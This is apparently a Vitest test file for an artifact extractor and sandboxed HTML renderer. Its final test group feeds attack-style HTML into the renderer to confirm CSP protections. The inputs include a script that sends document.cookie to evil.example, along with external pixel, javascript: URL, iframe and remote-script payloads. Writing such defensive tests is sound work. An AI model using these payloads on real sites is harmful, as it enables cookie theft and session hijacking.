import { describe, expect, it } from "vitest";
import type { SensorEvent } from "../src/types/events.js";
import { MAX_ARTIFACT_CHARS } from "../src/types/artifacts.js";
import { buildAnswerText, classifyLanguage, extractArtifacts, renderArtifactSrcdoc } from "../src/artifacts/artifacts.js";
import type { Artifact } from "../src/types/artifacts.js";

function delta(requestId: string, channel: "thinking" | "answer", text: string): SensorEvent {
  return { type: "sensor.text.delta", requestId, channel, text };
}

function artifact(language: string, code: string, index = 0): Artifact {
  return { id: `artifact-${index}`, index, language, code, kind: classifyLanguage(language) };
}

describe("buildAnswerText", () => {
  it("aggregates only the answer channel, ignoring thinking", () => {
    const events: SensorEvent[] = [
      delta("r1", "thinking", "先想"),
      delta("r1", "answer", "你好"),
      delta("r1", "thinking", "再想"),
      delta("r1", "answer", "世界"),
    ];
    expect(buildAnswerText(events)).toBe("你好世界");
  });

  it("returns empty for no events", () => {
    expect(buildAnswerText([])).toBe("");
  });

  it("returns empty when there are only thinking deltas", () => {
    expect(buildAnswerText([delta("r1", "thinking", "思考")])).toBe("");
  });
});

describe("extractArtifacts", () => {
  it("extracts a single html fence", () => {
    const result = extractArtifacts('```html\n<div>hi</div>\n```');
    expect(result).toHaveLength(1);
    expect(result[0]).toMatchObject({ index: 0, language: "html", code: "<div>hi</div>", kind: "render" });
    expect(result[0]?.id).toBe("artifact-0");
  });

  it("extracts multiple blocks with incrementing index", () => {
    const result = extractArtifacts('```html\n<div>a</div>\n```\n中间文本\n```python\nprint("b")\n```');
    expect(result).toHaveLength(2);
    expect(result[0]?.language).toBe("html");
    expect(result[1]?.language).toBe("python");
    expect(result[1]?.index).toBe(1);
    expect(result[1]?.id).toBe("artifact-1");
    expect(result[1]?.kind).toBe("code");
  });

  it("treats a fence with no language as code-only", () => {
    const result = extractArtifacts("```\nplain\n```");
    expect(result).toHaveLength(1);
    expect(result[0]?.language).toBe("");
    expect(result[0]?.kind).toBe("code");
  });

  it("ignores an unclosed trailing fence", () => {
    const result = extractArtifacts("```html\n<div>unclosed</div>");
    expect(result).toHaveLength(0);
  });

  it("handles CRLF line endings", () => {
    const result = extractArtifacts("```html\r\n<div>hi</div>\r\n```");
    expect(result).toHaveLength(1);
    expect(result[0]?.code).toBe("<div>hi</div>");
  });

  it("normalizes language case and surrounding whitespace", () => {
    const result = extractArtifacts("``` HTML \n<div>x</div>\n```");
    expect(result[0]?.language).toBe("html");
    expect(result[0]?.kind).toBe("render");
  });

  it("returns empty for plain text with no fence", () => {
    expect(extractArtifacts("just prose, no code")).toEqual([]);
  });
});

describe("renderArtifactSrcdoc", () => {
  it("renders html into a sandboxed srcdoc", () => {
    const plan = renderArtifactSrcdoc(artifact("html", "<div>hi</div>"));
    expect(plan.kind).toBe("render");
    expect(plan.sandbox).toBe("allow-scripts");
    expect(plan.srcdoc).toContain("<div>hi</div>");
    expect(plan.srcdoc).toContain("Content-Security-Policy");
  });

  it("keeps a complete document intact instead of nesting it in <body>", () => {
    const full = '<!doctype html><html><head><style>body{color:red}</style></head><body><h1>Hi</h1><script>document.body.dataset.ran="1"</script></body></html>';
    const plan = renderArtifactSrcdoc(artifact("html", full));
    expect(plan.kind).toBe("render");
    expect(plan.sandbox).toBe("allow-scripts");
    expect(plan.srcdoc).toBe(full);
    expect(plan.srcdoc).not.toContain("</head><body><!doctype");
  });

  it("renders svg", () => {
    const plan = renderArtifactSrcdoc(artifact("svg", "<svg><circle/></svg>"));
    expect(plan.kind).toBe("render");
    expect(plan.srcdoc).toContain("<svg");
  });

  it.each(["js", "ts", "python", "mermaid"])("downgrades %s to code-only", (lang) => {
    const plan = renderArtifactSrcdoc(artifact(lang, "code"));
    expect(plan.kind).toBe("code");
    expect(plan.srcdoc).toBe("");
    expect(plan.sandbox).toBe("");
    expect(plan.reason).toBe("unsupported-language");
  });

  it("downgrades oversized code to code-only with too-large reason", () => {
    const big = artifact("html", "x".repeat(MAX_ARTIFACT_CHARS + 1));
    const plan = renderArtifactSrcdoc(big);
    expect(plan.kind).toBe("code");
    expect(plan.srcdoc).toBe("");
    expect(plan.truncated).toBe(true);
    expect(plan.reason).toBe("too-large");
  });
});

describe("sandbox security contract", () => {
  const render = (code: string) => renderArtifactSrcdoc(artifact("html", code));

  it("never adds allow-same-origin, and always uses the single allow-scripts token", () => {
    const plan = render("<script>fetch('https://evil.example/steal?c='+document.cookie)</script>");
    expect(plan.sandbox).toBe("allow-scripts");
    expect(plan.sandbox).not.toContain("allow-same-origin");
    expect(plan.srcdoc).toContain("connect-src 'none'");
  });

  it("blocks external images via img-src data:", () => {
    const plan = render('<img src="https://evil.example/pixel.png" onerror="alert(1)">');
    expect(plan.srcdoc).toContain("img-src data:");
    expect(plan.srcdoc).not.toContain("img-src https:");
  });

  it("blocks javascript: URL exfiltration (connect-src + base-uri none)", () => {
    const plan = render('<a href="javascript:fetch(\'https://evil.example\')">x</a>');
    expect(plan.srcdoc).toContain("connect-src 'none'");
    expect(plan.srcdoc).toContain("base-uri 'none'");
  });

  it("blocks nested iframes", () => {
    const plan = render('<iframe src="https://evil.example"></iframe>');
    expect(plan.srcdoc).toContain("frame-src 'none'");
  });

  it("blocks external scripts (script-src has no https source)", () => {
    const plan = render('<script src="https://evil.example/x.js"></script>');
    expect(plan.srcdoc).toContain("script-src 'unsafe-inline'");
    expect(plan.srcdoc).not.toContain("script-src https:");
  });

  it("emits default-src 'none' in every rendered srcdoc", () => {
    expect(render("<div>ok</div>").srcdoc).toContain("default-src 'none'");
  });
});
